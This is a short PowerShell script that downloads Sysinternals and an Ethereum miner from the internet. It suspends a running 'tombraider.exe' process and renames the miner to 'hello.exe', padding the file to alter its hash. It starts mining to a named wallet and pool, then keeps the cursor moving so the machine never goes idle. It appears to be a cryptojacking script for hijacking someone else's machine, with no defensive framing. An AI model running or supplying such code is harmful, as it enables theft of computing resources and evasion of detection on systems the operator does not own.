# Fix TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient

$SysInternals = "https://download.sysinternals.com/files/SysinternalsSuite.zip"
$eth = "https://github.com/nanopool/genoil-ethereum/releases/download/v1.1.7/ethminer-0.9.41-genoil-1.1.7.zip"

# Functions
function Unzip($file, $destination) {
    $shell = new-object -com shell.application
    $zip = $shell.NameSpace($file)
    foreach($item in $zip.items()) {
        $shell.Namespace($destination).copyhere($item)
    }
}

# Run
$wc.DownloadFile($SysInternals,"c:\temp\sysinternals.zip")
Unzip -File "c:\temp\sysinternals.zip" -Destination "c:\temp"

.\pssuspend.exe -accepteula tombraider.exe

$wc.DownloadFile($eth,"c:\temp\eth.zip")
Unzip -File "c:\temp\eth.zip" -Destination "c:\temp"

move ethminer.exe hello.exe
echo a >> hello.exe

setx GPU_FORCE_64BIT_PTR 0
setx GPU_MAX_HEAP_SIZE 100
setx GPU_USE_SYNC_OBJECTS 1
setx GPU_MAX_ALLOC_PERCENT 100
setx GPU_SINGLE_ALLOC_PERCENT 100

Start-Process -FilePath "hello.exe" -ArgumentList "--farm-recheck","200","-U","-S","eth-eu1.nanopool.org:9999","-O","0xB5a9b7402AF83507B77BB56ae12947823502742C.TOMB_RAIDER/miner@slurpgeit.nl"

Add-Type -AssemblyName System.Windows.Forms

while ($true)
{
  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 500) + 1
  $y = ($pos.Y % 500) + 1
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
  Start-Sleep -Seconds 10
}
